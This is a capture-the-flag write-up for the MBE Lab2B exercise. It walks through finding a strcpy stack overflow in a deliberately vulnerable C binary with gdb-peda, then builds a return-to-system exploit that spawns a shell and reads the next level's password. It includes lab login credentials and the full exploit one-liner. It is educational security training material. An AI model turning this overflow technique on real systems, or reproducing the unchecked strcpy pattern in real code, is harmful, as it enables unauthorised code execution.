---
title: "Разбор Lab2B (средне)"
permalink: /writeups/mbe/lab2b/
excerpt: "Разбор Lab2B."
---

---
**Lab2B** is quite similar to the previous challenge, but the exploit we have to write will be a bit trickier. First, log into the Lab02 as **Lab2B** (`lab2B:1m_all_ab0ut_d4t_b33f`) and go to the challenges folder:

```shell
$ ssh lab2B@<VM_IP>
$ cd /levels/lab02/
```

Now we can check what this program does:

```shell
# Usage
lab2B@warzone:/levels/lab02$ ./lab2B
usage:
./lab2B string
# Testing
lab2B@warzone:/levels/lab02$ ./lab2B Test
Hello Test
```

Here, the program takes our argument and prepend the string "Hello " to it.

## Анализ исходного кода

Let's take a look at the source to get a better view of what happened here.

```c
char* exec_string = "/bin/sh";

void shell(char* cmd)
{
	system(cmd);
}

void print_name(char* input)
{
	char buf[15];
	strcpy(buf, input);
	printf("Hello %s\n", buf);
}

int main(int argc, char** argv)
{
	if(argc != 2)
	{
		printf("usage:\n%s string\n", argv[0]);
		return EXIT_FAILURE;
	}

	print_name(argv[1]);

	return EXIT_SUCCESS;
}
```

Like the previous level, the main issue here is that the user input size is not checked and we'll be able to overflow **buf** quite easily through the use of the *strcpy()* function. We can also see the *shell()* function which can execute any provided command and a char pointer, **exec_string**, containing *"/bin/sh"*.

There are multiple way to solve this one, but we'll stick with the way the developer of this challenge want us to do it. It means overwriting the *print_name()* return address with the call to the *system()* function and pass **exec_string** as an argument for this function.

## Динамический анализ

So, first we need to find a way to overflow the return address and pass an argument on the stack (**exec_string**). Here, we will use [PEDA](https://github.com/longld/peda) **pattern** features to help us.

```nasm
gdb-peda$ pattern arg 50
Set 1 arguments to program
gdb-peda$ run
Starting program: /levels/lab02/lab2B 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x39 ('9')
EBX: 0xb7fcd000 --> 0x1a9da8 
ECX: 0x0 
EDX: 0xb7fce898 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41412841 ('A(AA')
ESP: 0xbffff6a0 ("AA)AAEAAaAA0AAFAAbA")
EIP: 0x3b414144 ('DAA;')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x3b414144
[------------------------------------stack-------------------------------------]
0000| 0xbffff6a0 ("AA)AAEAAaAA0AAFAAbA")
0004| 0xbffff6a4 ("AEAAaAA0AAFAAbA")
0008| 0xbffff6a8 ("aAA0AAFAAbA")
0012| 0xbffff6ac ("AAFAAbA")
0016| 0xbffff6b0 --> 0x416241 ('AbA')
0020| 0xbffff6b4 --> 0x0 
0024| 0xbffff6b8 --> 0x0 
0028| 0xbffff6bc --> 0xb7e3ca83 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x3b414144 in ?? ()
gdb-peda$ pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 27 ; offset to overwrite RET
EBP+0 found at offset: 23
Registers point to pattern buffer:
[ESP] --> offset 31 - size ~19 ; offset to write an argument
Pattern buffer found at:
0xb7fd8006 : offset    0 - size   50 (mapped)
0xbffff681 : offset    0 - size   50 ($sp + -0x1f [-8 dwords])
0xbffff895 : offset    0 - size   50 ($sp + 0x1f5 [125 dwords])
References to pattern buffer found at:
0xbffff1d0 : 0xbffff681 ($sp + -0x4d0 [-308 dwords])
0xbffff660 : 0xbffff681 ($sp + -0x40 [-16 dwords])
0xbffff674 : 0xbffff681 ($sp + -0x2c [-11 dwords])
0xbffff758 : 0xbffff895 ($sp + 0xb8 [46 dwords])
gdb-peda$ 
```

Using the `pattern search` command, we can see how many bytes we ne to write in order to overwrite the return address as well as the address pointed by ESP:  
- EIP+0 found at offset: 27
- [ESP] --> offset 31 - size ~19

Here, **27** bytes are necessary to overwrite the return address. Also, as ESP is pointing at offset 31, we can provide a pointer to */bin/sh* right after the return address. Let's write a quick proof of concept.

```nasm
gdb-peda$ run `python -c 'print 27 * "\x41" + "\x42\x42\x42\x42" + "\x43\x43\x43\x43"'`
Starting program: /levels/lab02/lab2B `python -c 'print 27 * "\x41" + "\x42\x42\x42\x42" + "\x43\x43\x43\x43"'`
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x2a ('*')
EBX: 0xb7fcd000 --> 0x1a9da8 
ECX: 0x0 
EDX: 0xb7fce898 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff6b0 ("CCCC")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff6b0 ("CCCC")
0004| 0xbffff6b4 --> 0xb7fff000 --> 0x20f34 
0008| 0xbffff6b8 --> 0x804874b (<__libc_csu_init+11>:	add    ebx,0x18b5)
0012| 0xbffff6bc --> 0xb7fcd000 --> 0x1a9da8 
0016| 0xbffff6c0 --> 0x8048740 (<__libc_csu_init>:	push   ebp)
0020| 0xbffff6c4 --> 0x0 
0024| 0xbffff6c8 --> 0x0 
0028| 0xbffff6cc --> 0xb7e3ca83 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```
Perfect, as we can see EIP is now equal to **0x42424242** and the first value on the stack is **0x43434343**. Now, we have the control over the stack to write our return address and a pointer to */bin/bash*. Let's find the real values.

First, we need the address of the call to the *system()* function present in the *shell()* function.

```nasm
gdb-peda$ disas shell
Dump of assembler code for function shell:
   0x080486bd <+0>:	push   ebp
   0x080486be <+1>:	mov    ebp,esp
   0x080486c0 <+3>:	sub    esp,0x18
   0x080486c3 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486c6 <+9>:	mov    DWORD PTR [esp],eax
   0x080486c9 <+12>:	call   0x8048590 <system@plt>
   0x080486ce <+17>:	leave  
   0x080486cf <+18>:	ret    
End of assembler dump.
```

Here, the call to the *system()* function is at the address **0x080486c9**. Then, let's find a pointer to */bin/sh* in memory:

```nasm
gdb-peda$ searchmem /bin/sh
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
lab2B : 0x80487d0 ("/bin/sh")
lab2B : 0x80497d0 ("/bin/sh")
 libc : 0xb7f83a24 ("/bin/sh")
```

So, **0x080486c9** will be the return address and **0x80487d0** the string pointer.

## Решение

Now that we have analyzed how the input is handled, let's try it again and solve this challenge.

```shell
lab2B@warzone:/levels/lab02$ ./lab2B `python -c 'print 27 * "\x41" + "\xc9\x86\x04\x08" + "\xd0\x87\x04\x08"'`
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAЇ
$ whoami
lab2A
$ cat /home/lab2A/.pass
i_c4ll_wh4t_i_w4nt_n00b
```

Almost easy. Next [challenge](/writeups/mbe/lab2a/)!
